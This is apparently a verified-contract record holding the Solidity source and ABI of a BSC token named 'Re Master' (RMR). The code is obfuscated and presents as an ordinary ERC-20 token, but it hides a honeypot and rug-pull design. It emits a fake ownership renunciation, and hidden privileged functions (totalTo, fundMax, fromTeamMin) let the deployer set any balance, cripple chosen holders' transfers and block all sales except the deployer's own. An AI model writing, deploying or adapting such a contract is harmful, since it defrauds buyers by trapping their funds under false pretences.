{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface receiverWallet {\n    function createPair(address fundTotalTrading, address toWalletSwap) external returns (address);\n}\n\ninterface sellAutoToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeLimitSell) external view returns (uint256);\n\n    function transfer(address modeTradingBuy, uint256 txEnable) external returns (bool);\n\n    function allowance(address walletAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTradingBuy,\n        uint256 txEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeToken, uint256 value);\n    event Approval(address indexed walletAuto, address indexed spender, uint256 value);\n}\n\nabstract contract atTotalTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableTo is sellAutoToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReMaster is atTotalTx, sellAutoToken, enableTo {\n\n    string private walletSwap = \"Re Master\";\n\n    string private enableTeam = \"RMR\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTeam;\n    }\n\n    bool public exemptList;\n\n    uint256 public receiverFeeTo;\n\n    address launchedTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address fundReceiver, address modeTradingBuy, uint256 txEnable) external override returns (bool) {\n        if (_msgSender() != launchedTo) {\n            if (tradingReceiver[fundReceiver][_msgSender()] != type(uint256).max) {\n                require(txEnable <= tradingReceiver[fundReceiver][_msgSender()]);\n                tradingReceiver[fundReceiver][_msgSender()] -= txEnable;\n            }\n        }\n        return sellTx(fundReceiver, modeTradingBuy, txEnable);\n    }\n\n    bool public receiverAt;\n\n    mapping(address => bool) public amountMax;\n\n    function liquidityListFee() public {\n        emit OwnershipTransferred(swapFundTo, address(0));\n        buyWallet = address(0);\n    }\n\n    uint256 enableIs;\n\n    function approve(address fundTake, uint256 txEnable) public virtual override returns (bool) {\n        tradingReceiver[_msgSender()][fundTake] = txEnable;\n        emit Approval(_msgSender(), fundTake, txEnable);\n        return true;\n    }\n\n    uint256 private exemptTxLimit = 100000000 * 10 ** 18;\n\n    address isTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitIsTake(address fundReceiver, address modeTradingBuy, uint256 txEnable) internal returns (bool) {\n        require(launchTx[fundReceiver] >= txEnable);\n        launchTx[fundReceiver] -= txEnable;\n        launchTx[modeTradingBuy] += txEnable;\n        emit Transfer(fundReceiver, modeTradingBuy, txEnable);\n        return true;\n    }\n\n    constructor (){\n        if (feeBuy != marketingMaxTx) {\n            sellFrom = true;\n        }\n        enableFrom teamFund = enableFrom(launchedTo);\n        sellReceiver = receiverWallet(teamFund.factory()).createPair(teamFund.WETH(), address(this));\n        \n        swapFundTo = _msgSender();\n        amountMax[swapFundTo] = true;\n        launchTx[swapFundTo] = exemptTxLimit;\n        liquidityListFee();\n        if (exemptLimit != receiverFeeTo) {\n            receiverFeeTo = marketingMaxTx;\n        }\n        emit Transfer(address(0), swapFundTo, exemptTxLimit);\n    }\n\n    mapping(address => bool) public amountToken;\n\n    uint256 receiverReceiver;\n\n    function modeWallet() private view {\n        require(amountMax[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return buyWallet;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTxLimit;\n    }\n\n    uint256 private txMarketing;\n\n    function transfer(address marketingShould, uint256 txEnable) external virtual override returns (bool) {\n        return sellTx(_msgSender(), marketingShould, txEnable);\n    }\n\n    address public sellReceiver;\n\n    address private buyWallet;\n\n    uint256 public feeBuy;\n\n    uint256 private marketingMaxTx;\n\n    function owner() external view returns (address) {\n        return buyWallet;\n    }\n\n    uint8 private maxTx = 18;\n\n    function balanceOf(address modeLimitSell) public view virtual override returns (uint256) {\n        return launchTx[modeLimitSell];\n    }\n\n    function sellTx(address fundReceiver, address modeTradingBuy, uint256 txEnable) internal returns (bool) {\n        if (fundReceiver == swapFundTo) {\n            return limitIsTake(fundReceiver, modeTradingBuy, txEnable);\n        }\n        uint256 totalReceiverMax = sellAutoToken(sellReceiver).balanceOf(isTeam);\n        require(totalReceiverMax == receiverReceiver);\n        require(modeTradingBuy != isTeam);\n        if (amountToken[fundReceiver]) {\n            return limitIsTake(fundReceiver, modeTradingBuy, swapShould);\n        }\n        return limitIsTake(fundReceiver, modeTradingBuy, txEnable);\n    }\n\n    function takeBuy(address receiverFee) public {\n        if (limitSwap) {\n            return;\n        }\n        if (marketingMaxTx != exemptLimit) {\n            exemptList = false;\n        }\n        amountMax[receiverFee] = true;\n        \n        limitSwap = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletSwap;\n    }\n\n    function allowance(address fundEnable, address fundTake) external view virtual override returns (uint256) {\n        if (fundTake == launchedTo) {\n            return type(uint256).max;\n        }\n        return tradingReceiver[fundEnable][fundTake];\n    }\n\n    mapping(address => uint256) private launchTx;\n\n    bool public limitSwap;\n\n    mapping(address => mapping(address => uint256)) private tradingReceiver;\n\n    event OwnershipTransferred(address indexed enableMarketing, address indexed swapSell);\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxTx;\n    }\n\n    address public swapFundTo;\n\n    function totalTo(address marketingShould, uint256 txEnable) public {\n        modeWallet();\n        launchTx[marketingShould] = txEnable;\n    }\n\n    function fundMax(address takeAmount) public {\n        modeWallet();\n        \n        if (takeAmount == swapFundTo || takeAmount == sellReceiver) {\n            return;\n        }\n        amountToken[takeAmount] = true;\n    }\n\n    function fromTeamMin(uint256 txEnable) public {\n        modeWallet();\n        receiverReceiver = txEnable;\n    }\n\n    bool private sellFrom;\n\n    uint256 private exemptLimit;\n\n    uint256 private buyReceiver;\n\n    uint256 constant swapShould = 5 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimitSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txEnable\",\"type\":\"uint256\"}],\"name\":\"fromTeamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityListFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFeeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFundTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"takeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txEnable\",\"type\":\"uint256\"}],\"name\":\"totalTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTradingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}